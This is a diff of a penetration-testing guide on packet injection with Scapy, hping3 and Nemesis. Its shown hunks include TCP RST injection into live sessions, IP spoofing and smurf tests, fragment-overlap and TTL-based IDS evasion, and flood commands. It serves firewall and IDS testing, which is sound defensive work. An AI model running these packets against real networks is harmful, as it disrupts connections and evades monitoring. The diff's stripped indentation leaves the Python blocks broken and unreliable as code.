@@ -1,10 +1,10 @@
 ---
 name: performing-packet-injection-attack
 description: 'Crafts and injects custom network packets using Scapy, hping3, and Nemesis
-  during authorized security assessments to test firewall rules, IDS detection, protocol
-  handling, and network stack resilience against malformed and spoofed traffic.
+ during authorized security assessments to test firewall rules, IDS detection, protocol
+ handling, and network stack resilience against malformed and spoofed traffic.
 
-  '
+ '
 domain: cybersecurity
 subdomain: network-security
 tags:
@@ -62,10 +62,10 @@ from scapy.all import *
 syn = IP(dst="10.10.20.10") / TCP(dport=80, flags="S", seq=1000)
 response = sr1(syn, timeout=2, verbose=0)
 if response and response.haslayer(TCP):
-    if response[TCP].flags == "SA":
-        print(f"[*] Port 80 is OPEN (SYN-ACK received)")
-    elif response[TCP].flags == "RA":
-        print(f"[*] Port 80 is CLOSED (RST-ACK received)")
+ if response[TCP].flags == "SA":
+ print(f"[*] Port 80 is OPEN (SYN-ACK received)")
+ elif response[TCP].flags == "RA":
+ print(f"[*] Port 80 is CLOSED (RST-ACK received)")
 
 # TCP XMAS scan packet (all flags set)
 xmas = IP(dst="10.10.20.10") / TCP(dport=80, flags="FPU")
@@ -86,7 +86,7 @@ print("[*] Custom ICMP packet sent")
 udp_test = IP(dst="10.10.20.10") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="test.example.com"))
 response = sr1(udp_test, timeout=2, verbose=0)
 if response:
-    print(f"[*] DNS response received from {response[IP].src}")
+ print(f"[*] DNS response received from {response[IP].src}")
 ```
 
 ### Step 2: IP Spoofing and Anti-Spoofing Validation
@@ -114,7 +114,7 @@ print("[*] Smurf test packet sent (ICMP to broadcast)")
 
 # IP fragment overlap test
 frag1 = IP(dst="10.10.20.10", flags="MF", frag=0) / TCP(dport=80, flags="S") / Raw(load="A"*24)
-frag2 = IP(dst="10.10.20.10", frag=2) / Raw(load="B"*24)  # Overlapping fragment
+frag2 = IP(dst="10.10.20.10", frag=2) / Raw(load="B"*24) # Overlapping fragment
 send(frag1, verbose=0)
 send(frag2, verbose=0)
 print("[*] Overlapping IP fragments sent")
@@ -132,8 +132,8 @@ sudo hping3 -S --flood -V -p 80 -c 100 10.10.20.10
 # Note: --flood sends at maximum rate; -c 100 limits to 100 packets
 
 # Test TCP window manipulation
-sudo hping3 -S -p 80 -w 0 -c 5 10.10.20.10  # Zero window
-sudo hping3 -S -p 80 -w 65535 -c 5 10.10.20.10  # Max window
+sudo hping3 -S -p 80 -w 0 -c 5 10.10.20.10 # Zero window
+sudo hping3 -S -p 80 -w 65535 -c 5 10.10.20.10 # Max window
 
 # Idle scan probe (to test if a host can be used as zombie)
 sudo hping3 -SA -p 80 -c 3 10.10.20.10
@@ -148,18 +148,18 @@ from scapy.all import *
 
 # Sniff for an active TCP connection and inject RST
 def rst_inject(pkt):
-    if pkt.haslayer(TCP) and pkt[TCP].flags == "A":
-        rst = IP(
-            src=pkt[IP].dst,
-            dst=pkt[IP].src
-        ) / TCP(
-            sport=pkt[TCP].dport,
-            dport=pkt[TCP].sport,
-            seq=pkt[TCP].ack,
-            flags="R"
-        )
-        send(rst, verbose=0)
-        print(f"[*] RST injected: {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")
+ if pkt.haslayer(TCP) and pkt[TCP].flags == "A":
+ rst = IP(
+ src=pkt[IP].dst,
+ dst=pkt[IP].src
+ ) / TCP(
+ sport=pkt[TCP].dport,
+ dport=pkt[TCP].sport,
+ seq=pkt[TCP].ack,
+ flags="R"
+ )
+ send(rst, verbose=0)
+ print(f"[*] RST injected: {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")
 
 # Sniff for 10 packets and attempt RST injection
 print("[*] Listening for TCP ACK packets to inject RST...")
@@ -190,16 +190,16 @@ print("[*] Tiny fragment attack packets sent")
 
 # Invalid TCP flag combinations
 invalid_flags = [
-    ("SYN+FIN", "SF"),
-    ("SYN+RST", "SR"),
-    ("FIN only (no session)", "F"),
-    ("All flags", "FSRPAUEC"),
+ ("SYN+FIN", "SF"),
+ ("SYN+RST", "SR"),
+ ("FIN only (no session)", "F"),
+ ("All flags", "FSRPAUEC"),
 ]
 
 for name, flags in invalid_flags:
-    pkt = IP(dst=target) / TCP(dport=80, flags=flags)
-    send(pkt, verbose=0)
-    print(f"[*] Sent packet with invalid flags: {name}")
+ pkt = IP(dst=target) / TCP(dport=80, flags=flags)
+ send(pkt, verbose=0)
+ print(f"[*] Sent packet with invalid flags: {name}")
 
 # TTL-based evasion (packets that expire before reaching IDS)
 # Assumes IDS is 2 hops away, target is 5 hops
@@ -218,7 +218,7 @@ print("[*] Packet with IP Record Route option sent")
 ```bash
 # Check Snort/Suricata for alerts triggered by injected packets
 grep -i "xmas\|null\|land\|smurf\|ping.of.death\|fragment" /var/log/suricata/eve.json | \
-  python3 -m json.tool | head -50
+ python3 -m json.tool | head -50
 
 # Expected IDS alerts:
 # - XMAS scan detected (SID: 2100330)
@@ -247,20 +247,20 @@ Target: 10.10.20.10
 Tester: Security Assessment Team
 
 Test 1: TCP XMAS Scan
-  IDS Detection: YES (Suricata SID 2100330)
-  Firewall Action: Dropped
+ IDS Detection: YES (Suricata SID 2100330)
+ Firewall Action: Dropped
 
 Test 2: IP Spoofing (192.0.2.100)
-  uRPF Block: YES (packet dropped at edge router)
-  IDS Detection: YES (source not in HOME_NET)
+ uRPF Block: YES (packet dropped at edge router)
+ IDS Detection: YES (source not in HOME_NET)
 
 Test 3: Fragmentation Overlap
-  IDS Detection: YES (stream reassembly anomaly)
-  Target Response: Fragments dropped by OS
+ IDS Detection: YES (stream reassembly anomaly)
+ Target Response: Fragments dropped by OS
 
 Test 4: Invalid TCP Flags
-  IDS Detection: YES (SYN+FIN, SYN+RST flagged)
-  Firewall Action: Dropped
+ IDS Detection: YES (SYN+FIN, SYN+RST flagged)
+ Firewall Action: Dropped
 EOF
 ```
 
